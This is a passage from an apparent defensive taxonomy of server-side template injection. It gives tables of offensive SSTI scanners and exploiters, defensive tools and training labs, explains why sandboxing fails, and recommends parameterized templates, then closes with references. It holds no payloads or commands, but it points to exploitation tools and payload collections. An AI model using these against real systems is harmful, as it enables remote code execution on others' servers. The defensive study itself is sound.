| §2-1 (Config globals) | HackerOne #423541 | Shopify (Return Magic) | SSTI via Jinja2 in third-party integration |

---

## Detection Tools

### Offensive Tools (Scanners & Exploiters)

| Tool | Type | Target Scope | Core Technique |
|---|---|---|---|
| **SSTImap** | CLI scanner/exploiter | 15+ engines (Jinja2, Twig, Smarty, Mako, etc.) | Automated detection, identification, and exploitation with interactive mode |
| **Tplmap** | CLI scanner/exploiter | 15+ engines | Automated SSTI detection and exploitation; predecessor to SSTImap |
| **TInjA** | CLI scanner | 44 template engines across 8 languages | Polyglot-based detection and identification using Hackmanit Template Injection Table |
| **Burp Suite Scanner** | Commercial proxy | Multiple engines | Built-in SSTI detection rules with active scanning |
| **Nuclei SSTI Templates** | Template-based scanner | Multiple engines | YAML-based detection templates for automated scanning |
| **PayloadsAllTheThings** | Payload repository | All major engines | Comprehensive payload collection organized by engine and language |

### Defensive Tools & Resources

| Tool | Type | Target Scope | Core Technique |
|---|---|---|---|
| **Template Injection Table** | Interactive reference | 44 engines | Polyglot → engine identification mapping (Hackmanit) |
| **Template Injection Playground** | Testing environment | Multiple engines | Docker-based lab for testing SSTI payloads safely |
| **Semgrep SSTI Rules** | Static analysis | Multiple frameworks | Pattern-based detection of unsafe template rendering in source code |
| **TEFuzz** | Fuzzer (research) | PHP template engines | Discovered 55 exploitable sandbox bypasses in 7 PHP engines |
| **AngularJS CSTI Scanner** | CLI scanner | AngularJS 1.x | Automated client-side template injection detection |

### Research Resources

| Resource | Type | Coverage |
|---|---|---|
| **PortSwigger Web Security Academy** | Interactive labs | SSTI detection, identification, exploitation, sandbox escapes |
| **HackTricks SSTI** | Reference wiki | Comprehensive engine-specific payload documentation |
| **GoSecure Template Injection Workshop** | Training material | Hands-on workshop covering multiple engines |

---

## Summary: Core Principles

### The Fundamental Problem

Server-Side Template Injection exists because template engines are **designed to be Turing-complete** (or near-complete) — they must support complex logic, iteration, function calls, and object access to fulfill their role in web application rendering. This inherent expressiveness creates an irreconcilable tension between template functionality and security when untrusted input enters the template evaluation pipeline.

The root cause is not a bug in any individual engine but a **category-level design flaw**: the conflation of data and code in template rendering. When user input is concatenated into template source (rather than passed as a safe data parameter), the template engine cannot distinguish between the developer's intended logic and the attacker's injected directives. This is structurally identical to SQL injection and command injection — the same "data as code" confusion that has plagued computing since its inception.

### Why Incremental Fixes Fail

Sandbox approaches — denylists, allowlists, method restrictions — have been repeatedly bypassed across every major template engine (§4). The history demonstrates a consistent pattern: (1) a sandbox is implemented, (2) researchers find bypass via reflection, ClassLoader access, or application-specific object graphs, (3) the bypass is patched, (4) a new bypass is discovered using a different entry point. This arms race continues because sandboxes attempt to restrict a Turing-complete language to a "safe" subset — a problem that is provably undecidable in the general case.

The 2024 survey found that **31 of 34 studied template engines allow or have allowed RCE**, and only **10 of 34 offer any form of protection**. Even among those with protections, bypass research consistently finds new escape paths, particularly when templates operate within rich frameworks (Spring, Express, Laravel) that expose extensive object graphs.

### The Structural Solution

The only reliable defense against SSTI is **never allowing untrusted input to become part of template source code**. This means:

1. **Parameterized templates**: Pass user data exclusively through the template engine's data-binding API (`render_template(template, data=user_input)`), never through string concatenation into template source.
2. **Logic-less templates** (Mustache, Handlebars in strict mode): Use template engines that deliberately limit expressiveness to prevent code execution — though even these have been bypassed via prototype pollution (§5).
3. **Immutable template sources**: Ensure templates are loaded only from trusted, developer-controlled files — never constructed from user input at runtime.
4. **Defense in depth**: Even with correct template usage, apply output encoding, Content Security Policy, and principle of least privilege to limit blast radius if a vulnerability is introduced.

The most important insight from this taxonomy is that **the mutation space is unbounded** — each new template engine, framework integration, and library dependency introduces new exploitation paths. The defender's only sustainable strategy is to eliminate the injection vector entirely, not to enumerate and block individual payloads.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

- Kettle, J. (2015). "Server-Side Template Injection: RCE for the Modern Web App." Black Hat USA 2015. https://portswigger.net/research/server-side-template-injection
- Hackmanit. "Template Injection Table." https://cheatsheet.hackmanit.de/template-injection-table/index.html
- Hackmanit. "TInjA: Template Injection Analyzer." https://github.com/Hackmanit/TInjA
- SwisskyRepo. "PayloadsAllTheThings: Server Side Template Injection." https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Vladko312. "SSTImap: Automatic SSTI Detection Tool." https://github.com/vladko312/SSTImap
- Epinna. "Tplmap: Server-Side Template Injection Detection and Exploitation." https://github.com/epinna/tplmap
- Check Point Research. (2024). "Server-Side Template Injection: Transforming Web Applications from Assets to Liabilities." https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/
- Hildebrand, M. "Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning." Master Thesis, Hackmanit.
- Ackcent. "In-depth Freemarker Template Injection." https://ackcent.com/in-depth-freemarker-template-injection/
- Sartor, S. (2024). "CVE-2024-48962: SSTI with Freemarker Sandbox Bypass Leading to RCE." https://www.sebsrt.xyz/blog/cve-2024-48962-ofbiz-ssti/
- modzero. (2024). "Exploiting SSTI in a Modern Spring Boot Application (3.3.4)." https://modzero.com/en/blog/spring_boot_ssti/
- Munoz, A. & Mirosh, O. (2020). "Room for Escape: Scribbling Outside the Lines of Template Security." Black Hat USA 2020.
- Ethical Hacking UK. (2024). "CVE-2024-28116: Server-Side Template Injection in Grav CMS." https://ethicalhacking.uk/authenticated-server-side-template-injection-with-sandbox-bypass-in-grav-cms/
- YesWeHack. "Server-Side Template Injection Exploitation with RCE Everywhere." https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
- HackTricks. "SSTI (Server Side Template Injection)." https://book.hacktricks.wiki/pentesting-web/ssti-server-side-template-injection/
- Intigriti. "Server-Side Template Injection (SSTI): Advanced Exploitation Guide." https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti
- ArXiv:2405.01118. (2024). "A Survey of the Overlooked Dangers of Template Engines." https://arxiv.org/html/2405.01118v1
- OnSecurity. "Method Confusion In Go SSTIs Lead To File Read And RCE." https://onsecurity.io/article/go-ssti-method-research/
- Securitum. "Server Side Template Injection on the Example of Pebble." https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/
- Mizu. "EJS - Server Side Prototype Pollution Gadgets to RCE." https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce
- GitHub Security Lab. "GHSL-2020-050: Arbitrary Code Execution in Pebble Templates." https://securitylab.github.com/advisories/GHSL-2020-050-pebble/
